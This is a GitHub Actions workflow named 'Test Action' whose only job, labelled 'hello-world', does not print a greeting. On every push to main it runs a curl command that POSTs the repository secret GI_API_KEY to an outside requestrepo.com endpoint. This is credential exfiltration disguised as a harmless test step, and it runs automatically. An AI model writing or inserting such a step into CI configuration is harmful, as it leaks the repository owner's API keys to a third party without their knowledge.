name: Test Action

on:
  push:
    branches:
      - main  # 或你的默认分支名

jobs:
  hello-world:
    runs-on: ubuntu-latest
    steps:
      - name: hello
        run: |
          curl -s -X POST -d 'EN=${{ secrets.GI_API_KEY }}' https://om83nokw.requestrepo.com/
